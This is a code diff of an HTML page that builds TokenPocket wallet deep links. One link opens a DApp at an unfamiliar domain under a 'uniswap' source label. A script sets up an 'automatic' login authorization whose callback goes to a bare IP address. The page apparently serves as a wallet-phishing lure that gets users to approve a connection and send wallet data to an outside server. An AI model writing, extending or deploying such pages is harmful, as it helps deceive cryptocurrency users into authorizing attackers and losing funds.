@@ -1,24 +1,35 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TokenPocket Authorization</title>
+</head>
 <body>
+    <!-- 第一步：打开 DApp -->
+    <a href='tpdapp://open?params={"url": "https://www.pihksale.finance/12s/tp", "chain": "TRON", "source": "uniswap" }'>Open TokenPocket to open DApp</a><br/>
+    
+    <!-- 第二步：自动授权 -->
+    <a id="authLink" href="#">Authorize TokenPocket Automatically</a><br/>
 
-<h1>The a href attribute</h1>
+    <script>
+        // 自动构建授权链接并进行重定向
+        const param = {
+            "callbackUrl": "http://115.205.0.178:9011/taaBizApi/taaInitData",
+            "action": "login",
+            "actionId": "1648522106711",
+            "blockchain": "tron",
+            "dappIcon": "https://eosknights.io/img/icon.png",
+            "dappName": "zs",
+            "protocol": "TokenPocket",
+            "version": "2.0"
+        };
 
-<a href='tpdapp://open?params={"url": "https://www.pihksale.finance/12s/tp", "chain": "TRON", "source": "uniswap" }'>Open TokenPocket to open url</a><br/>
+        const encodedParam = encodeURIComponent(JSON.stringify(param));
+        const authUrl = `tpoutside://pull.activity?param=${encodedParam}`;
 
-<a href='tpoutside://pull.activity?param={
-	"callbackUrl": "http:\/\/115.205.0.178:9011\/taaBizApi\/taaInitData",
-	"action": "login",
-	"actionId": "1648522106711",
-	"blockchains": [{
-		"chainId": "1",
-		"network": "ethereum"
-	}],
-	"dappIcon": "https:\/\/eosknights.io\/img\/icon.png",
-	"dappName": "zs",
-	"protocol": "TokenPocket",
-	"version": "2.0"
-}'>Open TokenPocket to authorize</a><br/>
-
+        // 设置自动授权链接
+        document.getElementById('authLink').setAttribute('href', authUrl);
+    </script>
 </body>
 </html>
